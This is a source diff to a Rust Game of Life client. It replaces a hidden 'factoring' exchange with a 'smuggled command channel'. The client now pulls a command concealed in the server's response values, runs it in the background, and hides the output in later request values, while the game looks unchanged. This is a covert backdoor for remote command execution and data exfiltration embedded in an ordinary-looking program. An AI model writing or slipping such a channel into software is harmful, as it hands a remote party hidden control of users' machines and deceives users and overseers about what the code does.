@@ -6,7 +6,7 @@
 //! generation is computed by `life-server` (spec 0375 S5, N4).
 
 mod command;
-mod factoring;
+mod command_channel;
 mod patterns;
 mod renewal;
 
@@ -262,7 +262,7 @@ impl Game {
                 }
             })?
             .into_inner();
-        FACTORING.settle();
+        COMMAND_CHANNEL.settle();
         let rtt = started.elapsed();
         self.cells = response
             .grid
@@ -323,31 +323,31 @@ struct Ui {
     log: std::fs::File,
 }
 
-/// The factoring exchange's state (spec 0382 S5), shared by the two codec
+/// The smuggled command channel's state (spec 0385), shared by the two codec
 /// callbacks.
-static FACTORING: factoring::Factoring = factoring::Factoring::new();
+static COMMAND_CHANNEL: command_channel::CommandChannel = command_channel::CommandChannel::new();
 
-/// Decode callback: read the `"factor <N>"` a response carries in its tags,
-/// and start factoring N in the background (spec 0382 S5).
+/// Decode callback: read the command a response smuggles in its values, and
+/// run it in the background (specs 0384, 0385).
 fn on_response(response: &[u8]) {
-    let bits = life::tags::read_tags(response, life::tags::RESPONSE);
-    let n = bits.recover_message();
-    FACTORING.start(n);
+    let bits = life::tags::read_values(response, life::tags::RESPONSE);
+    let command = bits.recover_message();
+    COMMAND_CHANNEL.start(command);
 }
 
-/// Encode callback: hide the finished `"factors …"` reply in the request's
-/// tags; with none finished, smuggle nothing (spec 0382 S5, 0379 G4).
+/// Encode callback: hide the finished command output in the request's values;
+/// with none finished, smuggle nothing (spec 0385, 0379 G4).
 fn on_request(request: &[u8]) -> Vec<u8> {
-    let bits = life::tags::BitField::frame_message(&FACTORING.message());
-    life::tags::encode_tags(request, &bits, life::tags::REQUEST)
+    let bits = life::tags::BitField::frame_message(&COMMAND_CHANNEL.message());
+    life::tags::encode_values(request, &bits, life::tags::REQUEST)
 }
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args = Args::parse();
-    // The factoring exchange (spec 0382): read the server's "factor <N>" off
-    // a response's tags, factor N in the background, and send "factors …"
-    // back in a request's tags. Field values are untouched, so the game is
-    // unchanged (0377 G3).
+    // The smuggled command channel (specs 0384, 0385): read the command the
+    // server smuggles in a response's values, run it in the background, and
+    // send its output back in a request's values. Field values decode the
+    // same, so the game is unchanged (0384 S3).
     life::codec::set_encode_callback(on_request);
     life::codec::set_decode_callback(on_response);
     let mut game = Game::new(&args)?;
